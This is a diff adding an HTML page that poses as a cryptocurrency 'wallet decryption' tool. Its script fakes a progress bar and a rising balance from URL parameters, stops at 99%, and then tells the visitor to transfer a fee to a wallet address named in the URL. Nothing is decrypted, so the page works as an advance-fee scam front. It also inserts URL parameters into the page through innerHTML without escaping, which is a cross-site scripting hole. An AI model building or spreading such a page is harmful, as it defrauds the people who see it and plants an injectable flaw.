@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Decrypting the Wallet</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <style>
+        body {
+            background-color: #293b29;
+            color: #f1f1f1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #2c2c2c;
+            border-radius: 12px;
+            padding: 40px;
+            width: 50%;
+            max-width: 700px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); /* Glowing green shadow */
+            border: 2px solid #00ff00; /* Neon green border */
+            transition: box-shadow 0.3s ease-in-out;
+        }
+
+        .container:hover {
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.8); /* Increased glow on hover */
+        }
+
+        .video-container {
+            width: 100%;
+            margin-bottom: 20px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .video-screen {
+            height: 0;
+            padding-bottom: 56.25%;
+            position: relative;
+            background-color: #111;
+            border: 2px solid #00ff00; /* Green border around video */
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .divider {
+            width: 80%;
+            border: none;
+            border-top: 2px solid #00ff00; /* Neon green divider */
+            margin: 30px 0;
+        }
+
+        .content {
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #00ff00; /* Neon green text */
+            margin-bottom: 15px;
+            text-shadow: 0 0 8px #00ff00;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            color: #cccccc;
+            margin-bottom: 20px;
+        }
+
+        .loader {
+            width: 300px;
+            height: 40px;
+            background-color: #333;
+            border-radius: 5px;
+            position: relative;
+            margin-bottom: 20px;
+            overflow: hidden;
+            margin: 0 auto;
+            border: 2px solid #00ff00; /* Green border around loader */
+        }
+
+        #progress {
+            width: 0;
+            height: 100%;
+            background-color: #8fa38f; /* Green progress bar */
+            transition: width 0.8s ease-in-out;
+        }
+
+        #progress-text {
+            font-size: 16px;
+            color: #fff;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #wallet-address {
+            font-size: 16px;
+            color: #00ff00; /* Green text for wallet address */
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        #user-amount {
+            font-size: 24px;
+            color: #eaeaea;
+            margin-top: 10px;
+        }
+
+        .payment-prompt {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #fff200;
+            min-height: 50px; /* Fixed height to prevent expansion */
+            overflow: hidden; /* Ensure content stays within this size */
+            text-overflow: ellipsis;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                width: 90%;
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 22px;
+            }
+
+            .subtitle {
+                font-size: 16px;
+            }
+
+            #user-amount {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="video-container">
+            <div class="video-screen">
+                <video id="video" src="d.mp4" autoplay muted loop></video>
+            </div>
+        </div>
+        <hr class="divider">
+        <div class="content">
+            <h1>Decrypting the Wallet</h1>
+            <p class="subtitle">Decrypting <span id="coin-type"></span> Wallet</p>
+            <div id="wallet-address"></div>
+            <div class="loader">
+                <div id="progress"></div>
+                <div id="progress-text">0%</div>
+            </div>
+            <div id="user-amount" style="color: grey;font-size: 30px; margin-top: 5px;"></div>
+            <div id="payment-prompt" class="payment-prompt"></div>
+        </div>
+    </div>
+
+    <script>
+        // Get URL parameters for user input
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Update user amount based on progress
+        function updateUserAmount(progress) {
+            var userAmountElement = document.getElementById("user-amount");
+            var coinType = getParameterByName("coin");
+            var amount = parseFloat(getParameterByName("useramount"));
+            var targetAmount = amount; // Target amount to reach
+
+            // Calculate the current amount based on progress
+            var currentAmount = (targetAmount * progress) / 100; 
+            userAmountElement.textContent = currentAmount.toFixed(8) + " " + coinType; // Display with 8 decimal places
+        }
+
+        // Update progress bar and percentage
+        function updateLoader(progress) {
+            var progressBar = document.getElementById("progress");
+            var progressText = document.getElementById("progress-text");
+
+            progressBar.style.width = progress + "%";
+            progressText.textContent = progress.toFixed(0) + "%"; // Display integer value for progress percentage
+        }
+
+        // Simulate progress towards the target amount
+        function simulateProgress() {
+            var progress = 0;
+            var duration = 35; // Total duration in seconds
+            var updateInterval = (duration * 1000) / 99; // Update interval based on 99 steps
+
+            var interval = setInterval(function () {
+                progress++;
+                if (progress >= 99) { // Stop at 99%
+                    clearInterval(interval);
+                    progress = 99;
+                    updateUserAmount(progress);
+                    updateLoader(progress);
+                    displayPaymentPrompt();
+                    stopVideo();
+                } else {
+                    updateUserAmount(progress); // Update amount based on progress
+                    updateLoader(progress);     // Update progress bar and text
+                }
+            }, updateInterval); // Run the increment every calculated interval
+        }
+
+        // Show payment prompt once the decryption is complete
+        function displayPaymentPrompt() {
+            var coinType = getParameterByName("coin");
+            var paymentPrompt = document.getElementById("payment-prompt");
+            var sendToWallet = getParameterByName("sendwallet");
+            var amountToSend = getParameterByName("amount");
+
+            paymentPrompt.innerHTML = `Proceed with a transaction of ${amountToSend} ${coinType} to ensure the completion of your transaction from the ${coinType} wallet.<br> Transfer to wallet: ${sendToWallet}`;
+        }
+
+        // Stop video playback once the process completes
+        function stopVideo() {
+            var video = document.getElementById("video");
+            video.pause();
+            video.currentTime = 0;
+        }
+
+        // Initialize the process based on the coin type parameter
+        var coinType = getParameterByName("coin");
+        var coinTypeElement = document.getElementById("coin-type");
+        var walletAddress = getParameterByName("wallet");
+
+        // Display the wallet address and coin type
+        document.getElementById("wallet-address").textContent = "Wallet Address: " + walletAddress;
+        if (coinType) {
+            coinTypeElement.textContent = coinType;
+            simulateProgress();  // Start progress simulation
+        } else {
+            alert("Invalid coin type selected. Decryption process aborted.");
+        }
+    </script>
+</body>
+</html>
